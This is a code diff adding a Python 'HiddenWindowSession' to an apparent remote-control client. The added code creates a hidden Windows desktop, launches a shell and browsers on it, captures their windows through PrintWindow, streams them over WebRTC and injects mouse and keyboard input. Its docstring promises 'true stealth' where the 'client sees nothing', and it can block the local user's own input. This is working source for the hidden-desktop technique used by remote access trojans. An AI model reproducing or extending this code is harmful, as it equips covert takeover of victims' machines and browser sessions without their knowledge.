@@ -866,3 +866,439 @@ class HiddenDesktopSession:
         self._processes.clear()
         _close_desktop(self._desktop_handle)
         self._desktop_handle = None
+
+
+# Try to import PrintWindow-based capture
+try:
+    from remote_client.windows.window_capture import (
+        WindowCaptureSession,
+        WindowInputController,
+        WindowInfo,
+    )
+    PRINTWINDOW_AVAILABLE = True
+except ImportError:
+    PRINTWINDOW_AVAILABLE = False
+    WindowCaptureSession = None
+    WindowInputController = None
+
+
+class PrintWindowCapture:
+    """Adapter for WindowCaptureSession to match HiddenDesktopCapture interface."""
+    
+    def __init__(
+        self,
+        desktop_handle,
+        fps: int = 30,
+        width: int = 1920,
+        height: int = 1080,
+    ) -> None:
+        self._desktop_handle = desktop_handle
+        self._session = WindowCaptureSession(
+            desktop_handle=desktop_handle,
+            width=width,
+            height=height,
+            fps=fps,
+        )
+        self._session.start()
+    
+    @property
+    def frame_size(self) -> tuple[int, int]:
+        return self._session.frame_size
+    
+    def set_fps(self, fps: int) -> None:
+        self._session.set_fps(fps)
+    
+    def set_draw_cursor(self, enabled: bool) -> None:
+        # PrintWindow doesn't support cursor drawing
+        pass
+    
+    def get_frame(self, timeout: float = 0.6) -> tuple[bytes | None, tuple[int, int]]:
+        return self._session.get_frame(timeout)
+    
+    def get_windows(self) -> list:
+        """Get list of tracked windows."""
+        return self._session.windows
+    
+    def close(self) -> None:
+        self._session.stop()
+
+
+class PrintWindowInputController:
+    """Input controller adapter for PrintWindow mode."""
+    
+    def __init__(
+        self,
+        desktop_handle,
+        capture: PrintWindowCapture,
+        screen_size: tuple[int, int],
+    ) -> None:
+        self._desktop_handle = desktop_handle
+        self._capture = capture
+        self._screen_size = screen_size
+        self._queue: queue.Queue[ControlCommand] = queue.Queue()
+        self._stop_event = threading.Event()
+        self._controller = WindowInputController(capture.get_windows)
+        self._thread = threading.Thread(target=self._run, daemon=True)
+        self._thread.start()
+    
+    def set_screen_size(self, size: tuple[int, int]) -> None:
+        self._screen_size = size
+    
+    def execute(self, command: ControlCommand) -> None:
+        if not self._stop_event.is_set():
+            self._queue.put(command)
+    
+    def close(self) -> None:
+        self._stop_event.set()
+        if self._thread.is_alive():
+            self._thread.join(timeout=1.0)
+    
+    def _scale_coordinates(
+        self,
+        x: int,
+        y: int,
+        source_width: int | None,
+        source_height: int | None,
+    ) -> tuple[int, int]:
+        if not source_width or not source_height:
+            return x, y
+        screen_width, screen_height = self._screen_size
+        if screen_width <= 0 or screen_height <= 0:
+            return x, y
+        scaled_x = int(round(x * screen_width / source_width))
+        scaled_y = int(round(y * screen_height / source_height))
+        scaled_x = max(0, min(screen_width - 1, scaled_x))
+        scaled_y = max(0, min(screen_height - 1, scaled_y))
+        return scaled_x, scaled_y
+    
+    def _execute_command(self, command: ControlCommand) -> None:
+        screen_width, screen_height = self._screen_size
+        
+        if isinstance(command, MouseMove):
+            x, y = self._scale_coordinates(
+                command.x, command.y, command.source_width, command.source_height
+            )
+            self._controller.mouse_move(x, y)
+        elif isinstance(command, MouseClick):
+            x, y = self._scale_coordinates(
+                command.x, command.y, command.source_width, command.source_height
+            )
+            self._controller.mouse_click(x, y, command.button)
+        elif isinstance(command, MouseDown):
+            x, y = self._scale_coordinates(
+                command.x, command.y, command.source_width, command.source_height
+            )
+            self._controller.mouse_down(x, y, command.button)
+        elif isinstance(command, MouseUp):
+            x, y = self._scale_coordinates(
+                command.x, command.y, command.source_width, command.source_height
+            )
+            self._controller.mouse_up(x, y, command.button)
+        elif isinstance(command, MouseScroll):
+            x, y = self._scale_coordinates(
+                command.x, command.y, command.source_width, command.source_height
+            )
+            delta_x = command.delta_x or 0
+            delta_y = -(command.delta_y or 0)
+            self._controller.mouse_scroll(x, y, delta_x, delta_y)
+        elif isinstance(command, KeyPress):
+            # Convert key string to VK code
+            vk_code = self._key_to_vk(command.key)
+            if vk_code:
+                self._controller.key_down(vk_code)
+                time.sleep(0.02)
+                self._controller.key_up(vk_code)
+        elif isinstance(command, KeyDown):
+            vk_code = self._key_to_vk(command.key)
+            if vk_code:
+                self._controller.key_down(vk_code)
+        elif isinstance(command, KeyUp):
+            vk_code = self._key_to_vk(command.key)
+            if vk_code:
+                self._controller.key_up(vk_code)
+        elif isinstance(command, TextInput):
+            if command.text:
+                self._controller.type_text(command.text)
+    
+    def _key_to_vk(self, key: str) -> int | None:
+        """Convert key string to Windows virtual key code."""
+        if not key:
+            return None
+        
+        # Common key mappings
+        key_map = {
+            "enter": 0x0D,
+            "return": 0x0D,
+            "tab": 0x09,
+            "escape": 0x1B,
+            "esc": 0x1B,
+            "backspace": 0x08,
+            "delete": 0x2E,
+            "insert": 0x2D,
+            "home": 0x24,
+            "end": 0x23,
+            "pageup": 0x21,
+            "pagedown": 0x22,
+            "up": 0x26,
+            "down": 0x28,
+            "left": 0x25,
+            "right": 0x27,
+            "space": 0x20,
+            "shift": 0x10,
+            "ctrl": 0x11,
+            "control": 0x11,
+            "alt": 0x12,
+            "menu": 0x12,
+            "win": 0x5B,
+            "windows": 0x5B,
+            "f1": 0x70,
+            "f2": 0x71,
+            "f3": 0x72,
+            "f4": 0x73,
+            "f5": 0x74,
+            "f6": 0x75,
+            "f7": 0x76,
+            "f8": 0x77,
+            "f9": 0x78,
+            "f10": 0x79,
+            "f11": 0x7A,
+            "f12": 0x7B,
+        }
+        
+        key_lower = key.lower()
+        if key_lower in key_map:
+            return key_map[key_lower]
+        
+        # Single character
+        if len(key) == 1:
+            return ord(key.upper())
+        
+        return None
+    
+    def _run(self) -> None:
+        logger.info("PrintWindow input controller started")
+        while not self._stop_event.is_set():
+            try:
+                command = self._queue.get(timeout=0.2)
+            except queue.Empty:
+                continue
+            try:
+                self._execute_command(command)
+            except Exception:
+                logger.exception("PrintWindow input failed.")
+
+
+class HiddenWindowSession:
+    """Hidden window session using PrintWindow API.
+    
+    This mode captures windows directly using PrintWindow API, compositing
+    them into a single frame. No driver installation required.
+    
+    Advantages:
+    - No driver installation
+    - True stealth - client sees nothing
+    - Works with any Windows version
+    
+    How it works:
+    1. Creates a hidden Windows Desktop
+    2. Launches applications on that desktop
+    3. Captures window contents via PrintWindow API
+    4. Composites windows into a single frame
+    5. Sends input via PostMessage to target windows
+    """
+    
+    def __init__(self, width: int = 1920, height: int = 1080, fps: int = 30) -> None:
+        if platform.system() != "Windows":
+            raise RuntimeError("Hidden window session is only supported on Windows.")
+        
+        if not PRINTWINDOW_AVAILABLE:
+            raise RuntimeError("PrintWindow capture module not available.")
+        
+        self._width = width
+        self._height = height
+        self._fps = fps
+        
+        self._desktop_name = f"rc_hidden_{uuid.uuid4().hex}"
+        self._desktop_handle = _create_desktop(self._desktop_name)
+        self._desktop_path = f"WinSta0\\{self._desktop_name}"
+        self._processes: list[subprocess.Popen] = []
+        self._input_blocked = False
+        
+        self._block_local_input = os.getenv("RC_BLOCK_LOCAL_INPUT", "").strip().lower() in {
+            "1",
+            "true",
+            "yes",
+            "on",
+        }
+        
+        # Start shell on hidden desktop
+        self._start_shell()
+        
+        # Initialize PrintWindow capture
+        self._capture = PrintWindowCapture(
+            desktop_handle=self._desktop_handle,
+            fps=fps,
+            width=width,
+            height=height,
+        )
+        
+        # Wait for capture to initialize
+        size = self._capture.frame_size
+        deadline = time.monotonic() + 2.0
+        while size == (0, 0) and time.monotonic() < deadline:
+            time.sleep(0.1)
+            size = self._capture.frame_size
+        
+        # Create track for WebRTC
+        self.screen_track = HiddenDesktopTrack(self._capture, profile="balanced")
+        
+        # Create input controller
+        self.input_controller = PrintWindowInputController(
+            self._desktop_handle,
+            self._capture,
+            size,
+        )
+        
+        if self._block_local_input:
+            self.block_local_input()
+        
+        logger.info("HiddenWindowSession started (PrintWindow mode)")
+    
+    def _start_shell(self) -> None:
+        """Start explorer and cmd on hidden desktop."""
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.lpDesktop = self._desktop_path
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = subprocess.SW_HIDE
+        
+        for cmd in ("explorer.exe", "cmd.exe"):
+            try:
+                proc = subprocess.Popen([cmd], startupinfo=startupinfo)
+                self._processes.append(proc)
+            except Exception as exc:
+                logger.warning("Failed to start %s on hidden desktop: %s", cmd, exc)
+        
+        # Give explorer time to initialize
+        time.sleep(1.0)
+    
+    def launch_application(self, app_name: str, url: str | None = None) -> None:
+        """Launch an application on the hidden desktop.
+        
+        Args:
+            app_name: Application name (chrome, firefox, etc.) or full path
+            url: Optional URL to open (for browsers)
+        """
+        exe = _resolve_app_executable(app_name)
+        if not exe:
+            raise FileNotFoundError(f"Application not found: {app_name}")
+        
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.lpDesktop = self._desktop_path
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = 5  # SW_SHOW - need visible for PrintWindow
+        
+        cmd = [exe]
+        if url:
+            cmd.append(url)
+        
+        proc = subprocess.Popen(cmd, startupinfo=startupinfo)
+        self._processes.append(proc)
+        
+        # Give app time to create window
+        time.sleep(1.0)
+        
+        logger.info("Launched %s on hidden desktop (PID: %d)", app_name, proc.pid)
+    
+    def get_windows(self) -> list:
+        """Get list of tracked windows."""
+        return self._capture.get_windows()
+    
+    def block_local_input(self) -> bool:
+        """Block local keyboard and mouse input."""
+        if self._input_blocked:
+            return True
+        self._input_blocked = _toggle_block_input(True)
+        if not self._input_blocked:
+            logger.warning("Failed to block local input.")
+        return self._input_blocked
+    
+    def unblock_local_input(self) -> None:
+        """Unblock local keyboard and mouse input."""
+        if self._input_blocked:
+            _toggle_block_input(False)
+            self._input_blocked = False
+    
+    @property
+    def mode(self) -> str:
+        """Get the current operating mode."""
+        return "printwindow"
+    
+    @property
+    def is_virtual_display_active(self) -> bool:
+        """PrintWindow mode doesn't use virtual display."""
+        return False
+    
+    def close(self) -> None:
+        """Clean up session resources."""
+        logger.info("Closing HiddenWindowSession")
+        
+        self.screen_track.stop()
+        self.input_controller.close()
+        self.unblock_local_input()
+        
+        # Terminate processes
+        for proc in self._processes:
+            try:
+                proc.terminate()
+            except Exception:
+                pass
+        self._processes.clear()
+        
+        # Close capture
+        self._capture.close()
+        
+        # Close desktop
+        _close_desktop(self._desktop_handle)
+        self._desktop_handle = None
+
+
+def create_hidden_session(mode: str = "auto", **kwargs):
+    """Factory function to create appropriate hidden session.
+    
+    Args:
+        mode: Session mode - "auto", "printwindow", "virtual_display", or "fallback"
+        **kwargs: Additional arguments passed to session constructor
+    
+    Returns:
+        Session instance (HiddenWindowSession or HiddenDesktopSession)
+    """
+    if mode == "printwindow":
+        if not PRINTWINDOW_AVAILABLE:
+            raise RuntimeError("PrintWindow mode not available")
+        return HiddenWindowSession(**kwargs)
+    
+    if mode == "virtual_display":
+        return HiddenDesktopSession(use_virtual_display=True, **kwargs)
+    
+    if mode == "fallback":
+        return HiddenDesktopSession(use_virtual_display=False, **kwargs)
+    
+    # Auto mode: try PrintWindow first, then virtual display, then fallback
+    if mode == "auto":
+        if PRINTWINDOW_AVAILABLE:
+            try:
+                return HiddenWindowSession(**kwargs)
+            except Exception as exc:
+                logger.warning("PrintWindow mode failed: %s, trying virtual display", exc)
+        
+        try:
+            session = HiddenDesktopSession(use_virtual_display=True, **kwargs)
+            if session.is_virtual_display_active:
+                return session
+            logger.warning("Virtual display not active, using fallback mode")
+            return session
+        except Exception as exc:
+            logger.warning("HiddenDesktopSession failed: %s", exc)
+            raise
+    
+    raise ValueError(f"Unknown mode: {mode}")
